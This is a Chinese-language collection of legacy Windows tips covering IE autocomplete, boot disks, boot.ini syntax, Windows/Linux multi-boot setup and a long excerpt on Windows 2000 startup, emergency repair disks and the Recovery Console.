在IE中填写表格时，通常都会填写一些个人资料要下单购物或是加入会员，当填写到姓名、地址等常常要输入的表格时，IE就会发挥“自动完成”的功能，输入第一个字，后面的字就会自己出现或是以一个下拉列表让使用者选择。
利用注册表编辑器修改这个设定，可以改变自动完成的属性。运行regedit，进入注册表编辑器。找到“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoComplete”，修改“Append Completion”为“yes”即可在输入第一个字时，自动将后面的文字补上。默认设置为“no”，当输入第一个字时，会以下拉菜单让使用者选择要以那些字补上。 
38.修改我的收藏夹位置？
在windows目录中，有一个Favorites文件夹存放着“我的收藏”文件夹，如果要移动“我的收藏”，只要在IE关闭的状态下，打开资源管理器，对着“\WINDOWS\Favorites”文件夹按 Shift键，再用鼠标左键拖至您欲放置的目录中，就可以移动啦。
删除Windows 2000中可能用不到的全部驱动程序文件
Windows 2000的庞大目录结构，也使得系统所占的空间加大。若你细看，在\WINNT\driver cache\i386目录下，有一driver.cab的压缩文件，大小约52MB，主要是用来放置Windows 2000内置的全部驱动程序，用途是在我们新增设备时，Windows 2000可以自动地从这个压缩文件中提取出相应的驱动程序来进行安装，使用者无需再插入Windows 2000的光盘，若你已确定你的系统不会再变更系统设备时，就可以把driver.cab删除，省下50MB的空间挪做他用。 
39.如何加快图片显示？
如何加快图片显示 如何加快图片显示速度一直是我们在设计网页时一个重要的考虑 因素,利用 javascript 也能在一定程度上达到这一目的. script language= javascript !- image1= new image image1.src = 图片名称 image2 = new image image2.src = 图片名称 image3 = new image image3.src = 图片名称 // - /script 怎么样很是方便吧?这样浏览器在装载页面时就已经预先下载了3个图片(image1.gif,images2.gif和image3.gif).当激发onmouseover事件时. 
40.巧做完整启动盘？
在安装WINDOWS时，系统会强烈建议你做一张启动盘。但你嫌麻烦，略过该步，如果你现在想做一张完整的启动盘，请把一张软盘插入驱动器。步骤如下：“开始->运行，键入‘C:\windows\command\bootdisk.bat’单击确定，则打开一个DOS窗口。如果是A盘请键入1，如果是B盘，请键入2。然后按任意键开始系统盘制作。制作完成，关闭DOS窗口，然后把C盘根目录下的msdos.sys复制到该软盘，即可。 
41.如何修改文件的默认打开方式？
当遇到一个不知道如何打开的文件时，总喜欢用各种程序打开它，但如果忘记将“始终使用该程序打开这中类型的文件”左边的对号去掉，那末以后这类文件都用该程序打开，而不管是否有效。教你一个好方法：打开我的电脑，单击查看菜单中的“文件夹选项”选择“文件类型”，移动滑块在“已注册文件类型”窗口中找到该类型文件的扩展名，选中它，单击删除按钮，并在出现的提示中回答“是”，即可。 
42.windows98中误删“显示桌面”功能后的恢复？
打开记事本，建立一个新文件，输入：
[shell]
command=2
iconfile=explorer.exe,3
[taskbar]
Command=toggleDesktop
见文件保存为：“showDesktop.scf",路径为：C:\windows\Application Date\Microsoft\internet Explorer\Quick launch"
不需要重新启动，刷新一下就可以看到“显示桌面”按钮了。 
boot.ini文件解释
常见的boot.ini格式如下： 
[boot loader]
timeout=10
default=multi(0)disk(0)rdisk(0)partition(2)\WINXP
[operating systems]
multi(X)disk(Y)rdisk(Z)partition(Q)\WINXP="Microsoft Windows XP Professional" /fastdetect
SCSI(X)disk(Y)rdisk(Z)partition(Q)\WIN98="Microsoft Windows 98" /fastdetect 
其中[boot loader]在啸转发的帖子中已经有详细的介绍，这里就不再赘述。以下着重介绍[operating systems]部分。
1.partition(Q) 表示操作系统的系统根目录所在的分区在同一快硬盘上主分区的顺序号（Q从1开始）。
2.rdisk(Z) 若以multi开头，则Z植表示操作系统的系统根目录所在的分区所在的硬盘在同一个磁盘控制器上的硬盘顺序号（Z从0开始）。
若以SCSI开头，则Z值无意义，恒等于0。
3.disk(Y) 若以SCSI开头，则Y植表示操作系统的系统根目录所在的分区所在的硬盘在同一个磁盘控制器上的硬盘顺序号（Y从0开始）。
若以multi开头，则Y值无意义，恒等于0。
4.若计算机中既有IDE盘又有SCSI盘（或只有IDE），且BIOS中SCSI的设置设为enable，则以multi(X)开头，其中X表示操作系统的系统根目录所在的分区所在的硬盘所在的磁盘控制器在同一磁盘控制器上的顺序号（X从0开始计数）。
若计算机中只有SCSI控制器，则以SCSI(X)开头，其中X表示操作系统的系统根目录所在的分区所在的硬盘所在的磁盘控制器在同一磁盘控制器上的顺序号（X从0开始计数）。 
多操作系统安装问与答
一、Windows(98、2000、XP)部分 
1、问：我有一块新的硬盘，打算在上面装Windows98和Windows XP双操作系统，请问应该怎么分区和安装呢？
答：在新的硬盘上安装多操作系统是比较容易的事，可以省去重新调整分区的麻烦。根据实际情况可以考虑98装在C盘，XP装在D盘，其中C盘不用太大，一般有1~2G就行，如果98不打算用来运行什么大型程序的，500~600M也就够了；相对而言D盘可以留大一些，一般在5G左右，如果空间不够可以考虑减少，但至少要保证有2G的空间。步骤是是先在C盘装98，然后在98里运行XP的安装程序，选择全新安装，并制定安装位置为D盘。这样等XP安装完成后系统就会自动生成一个屏幕菜单，供你启动的时候选择要进的操作系统。对于Win98和Win2000双操作系统的安装方法与本例同。
2、问：我机子上原来装有Win98,我现在想装Win XP,请问98还有必要保留吗，该选择什么样的安装方式呢？ 
答：在98下安装XP有两种安装供选择，一种是升级式安装，即只对现有操作系统进行升级，安装完成后机子上只有一种操作系统；一种是全新安装，安装完成后机子上有两个操作系统。对于硬盘空间不是很紧张的朋友，建议还是选择全新安装，因为这样可以把98保留下来，万一XP出什么问题了它还可以应急，我觉得这比怎么什么应急工具都强，毕竟它是一个完整的操作系统，而且相比来说占用的空间很小（一个98系统只有两三百兆，而一个XP系统备份文件就有三百多兆）。
3、问：安装Win98和WinXP(Win2000)双操作系统，我的分区分别需要选用什么样的文件系统呢？ 
答：对于装98的分区，一般都是选用Fat32文件系统，而对于装XP或2000的分区，一般有Fat32和NTFS两种选择，具体选择那种根据实际情况而定，如果98系统还经常使用，则选用Fat32格式，因为NTFS格式的分区在98下无法识别，如果98系统只在极少数情况下才使用，则建议把装XP的分区转成NTFS格式，因为在XP和2000下NTFS比Fat32更有优势。

4、问：在安装多操作系统的时候都会提到boot.ini,能简要介绍这个文件吗？ 
答：boot.ini是一个包含完成引导过程所需信息的文本文件，用户可在任何文本编辑器中编辑它，其位置一般在激活分区的根目录下（例如C:\）。 我们前面提到的在XP安装完成后出现的屏幕菜单内容就是由它决定的，但是boot.ini的作用不仅仅是为用户提供菜单选项，这个文件是控制操作系统引导过程的一个重要机制。
下面是一个98和XP双操作系统boot.ini的例子：
[boot loader]
timeout=3
default=multi(0)disk(0)rdisk(0)partition(4)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(4)\WINDOWS="Microsoft Windows XP Professional" /fastdetect
C:\="Microsoft Windows"  
里面有两部分内容：第一部分[boot loader]包含了超时规定和操作系统的默认路径；第二部分 [operating systems]包含了安装在计算机上的操作系统的路径，其中multi(0)是适配器的顺序号，disk(0)是磁盘参数信息，rdisk(0)是连接到适配器上的磁盘的顺序号，partition(4)是分区号，partition项一般由XP安装的位置决定，如果是安装在C盘，则应该是partition(1)。
对于修改默认的操作系统和倒计秒数的长度，可以启用2000或XP下的“启动和故障恢复”（右击“我的电脑”，切换到“高级”选项卡，里面就有）来完成，不用直接编辑boot.ini文件。

二、Windows和Linux 
5、问：我打算在一个新的硬盘上安装Win98,WinXP,Linux三操作系统，应该怎么做呢？ 
答：步骤大致如下：
(1)分区。除了如问题1提到的为98和XP各预留一个分区以外，还要预留一个空的分区给Linux,大小由硬盘空间大小和linux的用途决定，如果打算用来运行大量程序的可以预留大一点，如果只想用来学习的，可以留小一点，但如果是安装Red Hat Linux 7.0以上的操作系统，所留空间最好不要小于2G.
(2)安装。先在C盘上装98，然后在D盘上装XP，最后再用Linux的安装盘启动，安装Linux.安装Linux时注意选择默认操作系统，如果经常用Windows,就选Dos为默认，反之则选Linux.
(3)启动。三个系统全部安装完毕后重新启动，将会遇到两个屏幕菜单供选择，第一个是 Linux的lilo菜单，选择是进linux还是进Windows,第二个是前面提到的boot.ini控制的菜单，选择是进98还是进XP.

6、问：我的电脑上原来已经装有Win98和Linux,现在我想加装Win XP,请问应该怎么办？ 
答：很简单，只要你手头上有进Linux的启动盘（一般linux在安装的时候都会提示制作的，如果没有制作或丢失了可以用linux的安装光盘再做一个）。步骤大致如下：
(1)进98，安装XP(全新安装)，安装完以后你会发现原先Linux的lilo屏幕菜单没有了，没关系，进行第二步。
(2)用Linux启动盘启动，以root身份登陆linux,运行一遍lilo命令，重新启动计算机，看，lilo菜单是不是又回来了？问题解决了  

7、问：我的电脑上原来已经装有Win2000,装2000的C盘用的是NTFS格式，而其他盘用的是Fat32格式的。后来我又装了Red Had 7.1,装完以后linux能进去，windows却不能进了，请问是什么回事，该怎么解决呢？ 
答：这里首先要介绍一下Linux系统设备的命名规则。在Linux里，各种设备和分区的命名方法完全不同于Dos,软驱，硬盘以及硬盘分区都有各自的设备特殊文件，例如：
  /dev/hda     表示第一个IDE硬盘（整个）
  /dev/hda1    表示第一个硬盘的第一个主分区
  /dev/hda2    表示第一个硬盘的第二个主分区
  /dev/hda3    表示第一个硬盘的扩展分区
  /dev/hda5    表示第一个硬盘的第一个逻辑分区
  /dev/hda6    表示第一个硬盘的第二个逻辑分区
  /dev/hdb     表示第二个硬盘（整个）
其中hda1对应着Windows里的C盘，而hda5一般对应着Windows的D盘。在linux安装的时候安装程序会自动寻找windows操作系统所在的分区，因为这里我们把C盘设成了NTFS格式的，有些linux安装程序不认这个格式，就把其他fat32格式的盘当作windows的启动盘了，这里应该就是这种情况。
解决的办法也很简单，只要以root身份登陆linux,用文本编辑器打开在/etc目录下的lilo.conf,找到
other=/dev/hda5 
optional
label=dos
这一段，把hda5(也可能hda6或其他)改成hda1,存盘，然后运行一遍lilo命令，重新启动，问题应该就能解决了。

8、问：我的机子上原来在C盘装了win98,D盘上装了win XP,后来为了装linux,我用分区魔术师从C盘上分出了两个区，但是当linux装上以后，win xp就不能进了，提示找不到hal.dll文件，请问是什么回事？ 
答：原因出在boot.ini文件上。正如问题4中提到的，partition表示分区号，原来没有从C盘分出两个区时xp所在的分区号是2（D盘），重新分区以后，XP所在的分区号就应该是4了，但boot.ini文件并不会自动改过来的，所以在启动XP时，引导程序还是跑到第二个分区里区找hal.dll文件，此时第二分区里已经是linux的文件了，当然会提示找不到，所以XP无法启动.解决的办法很简单，只要把boot.ini 里的partition(2)改成partition(4)就行了。

9、问：我在Linux里可以读写Dos分区里的文件吗，应该怎么做？

答：在linux里可以读写Fat32格式的文件，而对NTFS格式的文件只能读，不能写。方法和平常linux文件系统的加载相同。例如我要在linux里读我机子上D盘的内容，我要做的是运行下面的命令来加载D盘的文件系统：
[root@localhost /root]# mkdir /mnt/d
[root@localhost /root]# mount -t msdos /dev/hda5 /mnt/d/
这样当你再访问/mnt下面的d目录时，里面就是你d盘上的内容。 
还有一种更简单的方法是在/etc目录下的fstab文件里加上下面这一行(前提是 /mnt/d存在)：
/dev/hda5 /mnt/d msdos defaults 0 0

这样只要一启动linux，系统就会自动加载hda5上的文件系统，我们直接点击 /mnt/d就可以看到d盘上的内容。
深入了解Win2000 引导与启动
共摘抄了六部分，分别是：
一、 引导过程
二、 关于boot.ini
三、 高级选项菜单
四、 创建引导软盘
五、 创建和使用紧急修复盘（ERD）
六、 故障恢复控制台 
大家可以按顺序看，也可以挑些感兴趣的看，虽说是讲2000的，但里面很多内容也适合XP. 
计算机实际上有两个引导过程。首先是它本身的引导，然后是操作系统的引导。如果你将
计算机配置成双重引导，那么就可选择要引导的操作系统。当发生故障，或全部引导都失败时，
如果你事先做好了准备，就可以解决操作系统引导时出现的紧急情况。这里介绍了操作系统的
引导过程，同时介绍了与准备和排除故障有关的内容。 
一、 引导过程 
在安装过程中， Windows 2000的安装程序将数据写入计算机主分区（引导分区）的第一个
扇区中。这些数据就是“主引导记录（ M B R）”，它包含了X 8 6计算机可执行的指令。除了可执
行指令外， M B R还有一个最多包含4个项目的表，它定义主分区在磁盘上的位置。安装程序还把
两个初始化Windows 2000引导序列的文件（ N t l d r和N t d e t e c t . c o m）复制到引导驱动器的根目录
下。同时，文件b o o t . i n i也放置在了引导驱动器的根目录下，该文件包含了启动选项。
注意如果Windows 2000要使用的引导扇区是以前由DOS格式化的（Windows 9x和DOS一
样），Windows 2000安装程序就会将引导扇区的现有内容复制到一个名为b o o t s e c t . d o s的文
件中，并把它放在引导驱动器的根目录下。 
5.1.1 MBR代码执行 
在B I O S引导过程的最后一步，计算机将M B R读入内存，然后将控制交给M B R。可执行代码
在分区上搜索分区表，查找一个标识了可引导标记的分区。找到第一个可引导分区后，它会读
取该分区的第一个扇区，这就是引导扇区。
Windows 2000的启动文件位于系统分区上，操作系统文件位于引导分区上，对这两种分区
的说明如下：
. 系统分区包含引导Windows 2000所需要的硬件规格文件，包括M B R。在X 8 6计算机中，这
个分区必须是标记为活动的（ a c t i v e）主分区。它始终是驱动器0，因为它是B I O S将要访问
并把引导进程交给其M B R的驱动器。
. 引导分区包含了操作系统文件，% S y s t e m R o o t %目录。支持文件（%SystemRoot%\ System）
也必须位于引导分区。 
提示 没有必要使系统分区和引导分区是同一个分区，虽然这是一种常见的做法。 
二、 关于boot.ini 
屏幕菜单的内容由b o o t . i n i确定。但是b o o t . i n i的作用不仅仅是为用户提供菜单选项。这个文
件是控制操作系统引导过程的一个重要机制。
1. Boot.ini的内容
b o o t . i n i是一个包含完成引导过程所需信息的文本文件。用户可在任何文本编辑器中编辑它
（这个文件是只读和隐藏的，所以你必须在保存编辑结果之前更改它的属性——编辑完后，不要
忘记将属性还原）。
象任何. i n i文件一样，文件的每一节都由方括号内的一个节标题开始。文件中的信息是在操
作系统安装过程中创建的，所以它是针对计算机。文件有两节：
. [boot loader]
. [operating systems]
[boot loader]节包含了超时规定和操作系统的默认路径。超时规定是一个时间量，以秒计。
在这个规定的时间里，用户可在屏幕上做出对操作系统的选择。默认情况下，超时时间是3 0秒，
用户可在屏幕上看到倒计数秒，一直到0。如果用户在这段时间内没有做出选择，默认的操作系
统就会被加载。
你可以不用编辑b o o t . i n i就更改默认的操作系统和倒计数秒的长度：
1) 在控制面板中打开“系统”小程序（最快的方法是右击“我的电脑”，然后选择“属
性”）。
2) 切换到“高级”选项卡。
3) 单击“启动和故障恢复”，进入更改默认操作系统或菜单在屏幕上显示的时间长度的字段。 
警告 如果在boot.ini文件中只有一个操作系统，Windows 2000就不会等指定的时间过去后
再引导它，即使你规定超时时间为30秒、60秒，操作系统会在3秒钟后开始加载。 
[operating system]节包含了安装在计算机上的操作系统的路径。在基于X 8 6的计算机上，每
个操作系统的路径都在它自己的行上输入。信息的格式基于“高级R I S C计算（A R C）”规定中的
约定。
用引号括起来的文本串会显示在屏幕上。 
2. X86 ARC路径语句
在X 8 6计算机上有两种可用的A R C路径：以m u l t i ( )开始的行或以s c s i ( )开始的行。
m u l t i ( A ) d i s k ( B ) r d i s k ( C ) p a r t i t i o n ( D ) \ < % S y s t e m R o o t % >
s c s i ( A ) d i s k ( B ) r d i s k ( C ) p a r t i t i o n ( D ) \ < % S y s t e m R o o t % >
在这里：
. A是适配器的顺序号（第一个适配器是0，它应当是可引导的适配器）。
. B是磁盘参数信息，而且只与s c s i ( )语法一起使用。
. C是连接到适配器上的磁盘的顺序号。
. D是分区号，第一个编号是1（与适配器和驱动器相反，它们从0开始编号）。 
6. 加强b o o t . i n i
你可以通过加强b o o t . i n i文件中的项目来增强操作系统的引导过程。
对b o o t . i n i最常见的变化是将超时时间从3 0秒改为更小的数字（你也可以象我们在本章中说
明的那样，在控制面板的“系统”小程序中进行更改）。
警告有时用户将超时时间设为0，使计算机自动引导默认的操作系统。我们不推荐这样
做，不仅因为它取消了加载以前的操作系统的机会（如果存在），而且还因为它限制了按
F8键显示排除故障菜单的能力。
与Windows NT不同，你不能取消超时限制，必须保留屏幕菜单直到用户做出选择（即使他
永远不选择）。如果编辑b o o t . i n i并将超时限制改为- 1，那么这个限制就会被忽略。在下次引导期
间，超时被复位到以前的状态。
但是，你可以强制菜单停留在屏幕上，直到你准备通过按下除E n t e r键之外的任意键，或使
用方向键加亮显示不同的选项来做出选择。因为它要求用户的干预，所以如果你的目的是将菜
单保留在屏幕上，一直到用户做出选择，那么这不会有什么帮助作用。
你可以在b o o t . i n i的行中添加开关，一些常用的参数包括如下：
. /BASEVIDEO 强制系统进入6 4 0×4 8 0 ,，1 6色的V G A模式。
. / B A U D R ATE=NNNN 设置调试端口的波特率。默认的波特率为1 9 2 0 0，但是9 6 0 0是通过
M o d e m进行远程调试的首选速率。若使用/ B A U D R AT E开关，则自动使用/ D E B U G开关。
. /BOOTLOG 将引导过程的日志写入到% S y s t e m R o o t % \ n t b t l o g . t x t中，日志文件包含了在引
导过程中加载或没有加载的驱动程序清单。
. /CRASHDEBUG 如果Windows 2000崩溃（有停止（ S TO P）错误），则为调试启用C O M
端口，但允许用户为正常的M o d e m操作而继续使用C O M端口。
. /DEBUG 启用内核调试程序，通过C O M端口执行远程实时调试。
. / D E B U G P O RT=COMX 选择一个调试端口。默认情况下，如果存在的话，调试端口是
C O M 2。如果不存在，则默认为C O M 1。
...... 
7. 隐藏菜单选项
你可以隐藏屏幕菜单选项。例如，如果一台计算机除了安装Windows 2000 外还安装了
Windows 9x，而你可能不希望用户启动以前的操作系统，但又不想删除它（以免将来因为某些
原因需要让用户访问Windows 9x）。这也是一种隐藏已安装的Windows 2000 Server，并允许用户
访问Windows 2000 Professional的方式，反之亦然。
要使菜单项不可访问，在b o o t . i n i文件中，在希望屏幕菜单结束的地方添加[any text]项，那
么该项以下的内容都是不可见和不可访问的。例如，这里有一个禁止用户访问Windows 95的
b o o t . i n i文件： 
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINNT
[operating systems]
multi(0)disk(0)rdisk(0)partion(1)\WINNT="Windows 2000 Professional"
[any text]
c:\="Microsoft Windows" 
如果想允许访问[any text]以下的项，只要删除[any text]即可。
三、 高级选项菜单
如果操作系统出现引导故障，那么再次重新启动计算机，而且这次使用“高级选项”菜单。
当菜单出现时，注意屏幕底部的一行：
要排除故障并进入Windows 2000的高级启动选项，按F 8键
按F 8键可以显示一个包含如下选项的菜单，它是为帮助用户修复妨碍正常引导的故障而设
计的。
. 安全模式
. 带网络连接的安全模式
. 带命令提示的安全模式
. 启用启动日志
. 启动V G A模式
. 最后一次正确的配置
. 目录服务恢复模式（只适用域控制器）
. 调试模式
注意如果你使用远程安装服务安装Windows 2000，那么高级启动选项可能包含有关R I S
的其他选项。
使用方向键选取要使用的启动选项，然后按回车键，返回最初的引导菜单。然后再选取使
用你所选择的高级选项进行启动的操作系统。
警告如果选取了一个高级选项，那么必须在最初的菜单中选择一个Windows 2000的版本。
不要尝试和以前的Windows版本一起使用任何高级选项。
如果要返回最初的引导菜单，而不选择任何高级选项，那么按E S C键。
5.2.1 安全模式
安全模式最有用的部分是允许访问所有的驱动器，而不管文件系统。如果它可以工作，那
么你可以更改配置来纠正问题。例如，在删除最近安装的不能正常工作的驱动程序，或撤消某
些已实施的配置方案时，通常需要进入安全模式。
. 安全模式只加载基本的文件以及使操作系统启动并运行的驱动程序：鼠标、监视器、键
盘、存储器、基本的视频和默认的系统服务。
. 带网络连接的安全模式添加了网络支持（N I C驱动程序），但是不能在PCMCIA NIC下工
作。
. 带命令提示的安全模式与安全模式一样，除了引导过程以一个命令窗口，而不是G U I结
束。
注意使用任意安全模式选项会导致日志文件写入%SystemRoot%\ntbtlog.txt，参见本节中
的“启用引导日志”。
5.2.2 启用启动日志
这个选项指示Windows 2000创建一个日志文件（ % S y s t e m R o o t % \ n t b t l o g . t x t）。文件显示了
所有加载或没有加载的驱动程序清单。下面是一个典型的n t b t l o g . t x t文件的一小部分（顺便说一
下，这是个U n i c o d e文件）：
5.2.3 启动VGA模式
Windows NT 4用户可能熟悉这个选项，它使用基本的V G A驱动程序启动Windows 2000。为
工作不正常的视频卡（操作系统在下次引导中装载G U I时，它是非常明显的）安装完新的视频驱
动程序后使用这个选项。基本的视频驱动程序和以任何安全模式启动Windows 2000时使用的是
一样的。
5.2.4 最后一次正确的配置
利用这个选项可以使用上次关机时保存在注册表中的设置启动Windows 2000。这个选项能
够解决因驱动程序丢失或崩溃而导致的故障，它对于覆盖由于上次会话中对配置所做的更改而
导致的故障是很有用的。丢弃这些更改通常是一件好事。
5.2.5 目录服务恢复模式
这个选项只能用于域控制器，它恢复% S y s t e m R o o t % S y s v o l目录和Active Directory。S y s v o l
目录存储域的公共文件，它们在域控制器之间复制。
5.2.6 调试模式
使用这个选项启动Windows 2000，并通过串行电缆将调试信息发送到另一台计算机上。
四、 创建引导软盘
如果在操作系统的引导过程中，以前加载的某个文件（ n t l d r、n t d e t e c t . c o m或b o o t . i n i）丢失
或崩溃，则不能进入高级菜单选项来修复系统。你可以通过使用专门为Windows 2000安装创建
的引导盘来解决这个问题。
5.3.1 在自己的系统上创建引导软盘
如果明智的话，只要你的Windows 2000安装一结束并且能运行（无错误），就要创建一个引
导软盘。不幸的是，很少用户能听得进这个忠告，在没有出现引导故障之前，他们认为没有必
要创建引导软盘。尽管如此，如果你是一个机智的、凡事考虑在前的人，那么按如下步骤完成
这项任务：
1 ) 将一张软盘插入到驱动器中。
2) 打开“我的电脑”或“Wi n d o w s资源管理器”，右击软盘驱动器对象。
3) 从快捷方式菜单中选择“格式化”，并使用默认的选项格式化软盘上。
4 ) 将以下文件从硬盘驱动器的根目录复制到软盘上：
. Ntdetect.com
. Ntldr. c o m
. Boot.ini
. Ntbootdd.sys
通过启动操作系统来测试这张软盘。
注意只有存在一个S C S I系统时，才存在n t b o o t d d . s y s文件，它是你重命名的S C S I驱动程
序。
5.3.2 在另一台Windows 2000计算机上创建引导软盘
如果没来得及创建引导软盘，系统就被破坏了，而且你需要引导软盘启动它，那么可以在
另一台运行同样版本（ P r o f e s s i o n a l或其中一个S e r v e r版本）和相同文件系统（ N T F S、FAT或
FAT 3 2）的Windows 2000计算机上创建引导软盘。
1) 按照在自己的计算机上创建引导盘的步骤创建一张引导软盘。
2) 打开b o o t . i n i并检查它，确保它与你自己的配置相匹配。如果不匹配，根据在“关于
b o o t . i n i”一节中的说明调整设置。
3) 如果你有一个不同的S C S I控制器，那么找到正确的驱动程序文件，然后把它复制到软盘
上，删除从创建引导盘的计算机上复制的n t b o o t d d . s y s文件，再把你自己的S C S I驱动程序重命名
为n t b o o t d d . s y s。
4) 如果源计算机使用一个I D E控制器，并且你的系统有一个S C S I控制器，那么使用记事本
调整b o o t . i n i文件中的设置，然后将正确的S C S I 驱动程序复制到软盘，并把它重命名为
n t b o o t d d . s y s。
5) 如果源计算机使用一个S C S I控制器，而且系统中有一个I D E控制器，那么使用记事本调
整b o o t . i n i文件中的设置，如果从源计算机上复制了n t b o o t d d . s y s文件，就将它删除。
在你的计算机上测试引导软盘。
5.3.3 在运行不同Windows版本的计算机上创建引导软盘
如果你找不到运行同一版本的Windows 2000和使用相同文件系统的计算机，你仍然可以创
建用于你的计算机的引导软盘。你需要下列东西：
. 一张空白软盘。
. 1#安装盘（包含在Windows 2000包中的其中一张软盘）。
. Windows 2000的C D - R O M原始介质（如果原始文件在网络服务器上，就不需要C D - R O M）。
. SCSI 控制器的驱动程序文件（如果计算机有一个S C S I控制器）。
注意如果你找不到Windows 2000介质的软盘，可以使用本章后面的“创建Windows 2000
软盘”一节中的介绍的方法来创建它。
你可以在有C D - R O M驱动器（在其中插入Windows 2000的C D - R O M）或能通过网络共享访
问Windows 2000光盘上的文件副本的任何一台计算机来执行这项任务：
1) 在软盘驱动器中插入Windows 2000的第一张安装盘，然后打开“我的电脑”，右击“软盘
驱动器”对象。
2) 从快捷方式菜单中选择“复制磁盘”。
3) 按照提示插入源盘（ 1 #安装盘），然后是目标盘（你的空白软盘），直到复制过程结束。
4) 删除新软盘上的所有文件。
5) 将C D - R O M或网络共享节点i 3 8 6目录下的n t d e t e c t . c o m和n t l d r文件复制到新软盘。
6) 将n t l d r重命名为s e t u p l d r. b i n。
7) 打开记事本并创建一个b o o t . i n i文件，将它保存在新软盘上（见下一节“创建快速的
B o o t . i n i文件）。
8) 如果你的计算机有一个S C S I控制器，那么将正确的驱动程序复制到新软盘上，然后重命
名为n t b o o t d d . s y s。
9) 回到你的计算机上，使用新软盘引导系统，并登录。
10) 将Windows 2000 CD-ROM放到C D - R O M驱动器中，或访问存储Windows 2000文件的网
络共享。
11) 将n t l d r从i 3 8 6目录复制到你的硬盘驱动器的根目录下。
当在没有运行Windows 2000的计算机上创建引导软盘时，我无法解释的一个事实是：你不
能简单地将n t l d r复制到新软盘上并使用它（没有将它重命名）。我试过，在引导过程中，软盘被
访问后立即出现有关n t l d r的错误信息。但按照这里说明的步骤会工作得很好。
5.3.4 创建快速boot.ini文件
你的快速b o o t . i n i文件只加载Windows 2000，所有没有必要担心b o o t . i n i文件中涉及另一个操
作系统的行，即使你的计算机配置成了双重引导。下面是一个示例：
. 如果计算机从I D E或E I D E硬盘驱动器上引导，将s c s i ( 0 )替换成m u l t i ( 0 )。
. 如果Windows 2000系统文件不在名为Wi n n t的目录下，那么使用正确的名称替换这两个实
例。
. 如果有多个控制器、驱动器或分区，那么阅读本章前面的5 . 1 . 8节，确保引用了正确的硬
件。
警告在Windows 2000 Professional中创建的磁盘不能用于Windows 2000 Server，反之亦然。
五、 创建和使用紧急修复盘（ERD）
Windows 2000处理E R D的创建和使用的方式与以前的Windows NT版本有很大的不同。你会
发现它不如以前的强大（但从另一个方面讲，在Windows 2000中有一些在Windows NT中不存在
的附加的修复和恢复过程）。
5.4.1 ERD的功能
E R D可以帮助修复下列元素出现的故障：
. 系统文件
. 分区的引导扇区
. 双重引导系统的环境设置
不能使用E R D修复注册表故障。
5.4.2 创建ERD
如果你使用过以前的Windows NT，那么可能会对Windows 2000 的E R D功能感到失望。
R d i s k . e x e已经没有了，代之以遍历菜单项目层来创建E R D。
E R D是备份功能集的一部分，若要启动它，单击下列菜单命令：
1) 开始
2) 程序
3) 附件
4) 系统工具
5) 备份
当备份程序窗口打开时，从菜单栏上单击“工具” |“创建一张紧急修复软盘”。这时会打开
一个对话框，要求你在驱动器A中插入一张空白的已格式化软盘。然后，单击“确定”。过了一
会儿，出现一个对话框告诉你修复数据已经成功地保存了。给E R D磁盘贴上标签，并把它放在
一个安全的地方。
E R D中有下列文件：
. Autoexec.bat
. Config.nt
. Setup.log
S e t u p . l o g是一个已加载的文件和驱动程序的清单，其中还有计算机的配置信息，图5 - 2显示
了这个文件的一部分。
图5-2 ERD中的setup.log文件含有系统的配置信息
提示改变系统的配置后应重新创建ERD。
5.4.3 使用ERD
如果操作系统不能引导，可以使用E R D尝试修复安装。如果故障是由系统文件或双重引导
设置的丢失或崩溃造成的，那么这样做通常能修复它。E R D不能修复注册表。
在修复系统时，实际上开始了Windows 2000的另一次安装。
. 如果计算机不能从C D - R O M引导，就使用Windows 2000的1 #安装软盘引导。
. 如果计算机能从C D - R O M引导，可使用Windows 2000的C D或1 #安装软盘。
. 基于A l p h a的计算机必须使用C D。
Windows 2000要完成安装程序。在这个过程的结尾，安装程序发现Windows 2000已经安装
了，因此为用户提供了需要执行修复的选项。这时屏幕上出现一个安装消息，显示如下3个选择：
. 现在安装Windows 2000，按回车键。
. 修复Windows 2000的安装，按R键。
. 退出安装程序，不安装Windows 2000，按F 3键。
按R显示修复菜单，它提供两个选择：
. 使用故障恢复控制台修复Windows 2000安装，按C键。
. 使用紧急修复过程修复Windows 2000安装，按R键。
按R使用紧急修复进程。下一屏包含了一条消息，它实质上是警告你这是一个不确定的过程。
此外，还要求你选择是手工修复（按M键）还是快速修复（按F键）。
手工修复让你决定修复的过程—你可以替换系统文件、分区引导扇区或启动环境。注册表
不能修复。安装程序将要求你在驱动器A中插入E R D。
快速修复将修复过程交给安装程序。安装程序将尝试修复系统文件、分区引导扇区、启动
环境和注册表（注册表修复过程将恢复在首次安装Windows 2000时创建的注册表）。选择完要
安装程序执行的任务后，你会被提示插入E R D。
注意即使你没有E R D，也可以使用这些修复选项中的一个。如果按L，安装程序将搜索
Windows 2000的安装文件。
任务执行完后，重新启动计算机。如果操作系统仍不能启动，就必须重新安装Windows 2000。
六、 故障恢复控制台
故障恢复控制台是一个命令行程序，可用来修复系统故障。虽然这个功能提供了一个有限
的命令集，但是可用来修复M B R、复制丢失或崩溃的系统文件，和重新配置工作不正常（或不
完全正常）的服务。
有两种使用故障恢复控制台的方式：
. 使用Windows 2000安装盘或可引导的Windows 2000 CD进入控制台选项。
. 安装故障恢复控制台，并使它在Windows 2000的引导菜单中可用。
5.5.1 使用安装程序访问故障恢复控制台
当操作系统根本不引导或引导时出现了太多的故障，使你明白显然有问题时，这种方法可
作为一种急救方法。
首先用1 #安装引导盘引导计算机，然后在Windows 2000准备安装它自己的同时，根据提示
插入其他的3张软盘。当最后一张软盘完成它的工作后，一个欢迎安装的消息出现在屏幕上，这
个消息显示3个选项：
. 若要立即安装Windows 2000，按回车键。
. 若要修复Windows 2000的安装，按R键。
. 若要退出安装程序，不安装Windows 2000，按F 3键。
按R显示修复菜单，它提供了两个选择：
. 使用故障恢复控制台修复Windows 2000安装，按C键。
. 使用紧急修复过程修复Windows 2000安装，按R键。
按C键启动Windows 2000的故障恢复控制台（如果在显示出内容之前，出现几秒钟的黑屏，
不要紧张！）。
故障恢复控制台是以文本模式运行的，而且屏幕上显示一个带有编号的操作系统目录列表。
通常情况下只有一个（ C : \ W I N N T），除非你配置了两个不同的Windows 2000版本进行双重引导。
具体步骤如下：
1) 输入你想登录并进行修复的Windows 2000的编号，然后按回车键。
2) 自动登录A d m i n i s t r a t o r，输入A d m i n i s t r a t o r的密码，并按回车键。
